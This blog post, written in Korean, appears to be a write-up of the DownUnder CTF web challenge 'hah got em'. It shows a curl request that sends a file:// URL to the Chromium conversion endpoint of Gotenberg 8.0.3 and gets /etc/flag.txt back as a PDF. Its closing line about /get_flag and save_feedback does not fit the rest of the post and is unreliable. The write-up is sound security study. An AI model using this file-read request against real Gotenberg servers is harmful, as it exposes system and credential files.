---
layout: post
title: DUCTF | hah got em write-up
subtitle: Downunder CTF web
categories: CTF
tags: [CTF, Web]
---

## 문제 분석

<p align="center">
<img src ="https://github.com/peoplstar/peoplstar.github.io/assets/78135526/9f615dbf-752b-4ee7-86a7-66167da66884" width = 450>
</p>

Oh by the way I love using my new microservice parsing these arrest reports to PDF

해당 문제에 접근 시 **Not Found**만 나오는 것을 확인할 수 있다.

```Docker
FROM gotenberg/gotenberg:8.0.3

COPY flag.txt /etc/flag.txt

version: "3.2"

services:
  gotenberg:
    build: src/.
    ports:
      - 3000:3000
```

해당 파일의 경우 `gotenberg:8.0.3`만을 사용하며 어떠한 페이지가 존재하지 않는 것을 확인할 수 있다.

<p align="center">
<img src ="https://github.com/peoplstar/peoplstar.github.io/assets/78135526/ca4255cd-6b72-482c-9371-c687310f7362" width = 850>
</p>

`gotenberg`이 무엇인지 확인해보면 어느 한 페이지에 대해 PDF로 변환해주는 모듈인 것을 확인할 수 있다.

그렇다는 것은 해당 버전에 대한 취약점 존재 여부를 파악할 필요가 있다.

<p align="center">
<img src ="https://github.com/peoplstar/peoplstar.github.io/assets/78135526/65f9d3d6-ddfe-40fe-b1b5-5088e00cca50" width = 850>
</p>

해당 소스는 Git에도 있기에 8.0.3 버전 다음 버전인 8.1.0 버전을 확인해본 결과 Chromium 모듈의 경우 시스템 파일에 대한 파일 읽
는 것이 가능하다는 것을 확인하였습니다.

즉, 해당 모듈을 사용함에 있어서 `/etc/flag.txt`의 파일을 URL로 접근하여 파일의 내용을 PDF로 추출하는 것임을 알 수 있다.

```bash
curl \
--request POST http://localhost:3000/forms/chromium/convert/url \
--form url=https://my.url \
--form landscape=true \
--form marginTop=1 \
--form marginBottom=1 \
-o my.pdf
```

공식 홈페이지를 통해 사용하는 방법을 확인하였으니 아래와 같이 수정하여 PDF를 추출합니다.

```bash
curl \
--request POST https://web-hah-got-em-20ac16c4b909.2024.ductf.dev/forms/chromium/convert/url \
--form url=file://localhost/etc/flag.txt \
--form landscape=true \
--form marginTop=1 \
--form marginBottom=1 \
-o my.pdf
```

URL의 프로토콜은 `http`, `file`, `ftp` 등이 존재하지만 파일을 받기 위한 **file**, 또한 서버측에 존재하는 파일을 가져오기 위한 **localhost**로 지정하여 PDF로 추출합니다.

<p align="center">
<img src ="https://github.com/peoplstar/peoplstar.github.io/assets/78135526/753ddbc7-483f-454a-abda-4c301d6754f2" width = 850>
</p>

`/get_flag`에 접근 시 `save_feedback`을 통해 **flag=True**가 되었기에 플래그 추출이 가능하였습니다.

* **참고** : [gotenberg Github](https://github.com/gotenberg/gotenberg/releases/tag/v8.1.0)

* **참고** : [gotenberg](https://gotenberg.dev/)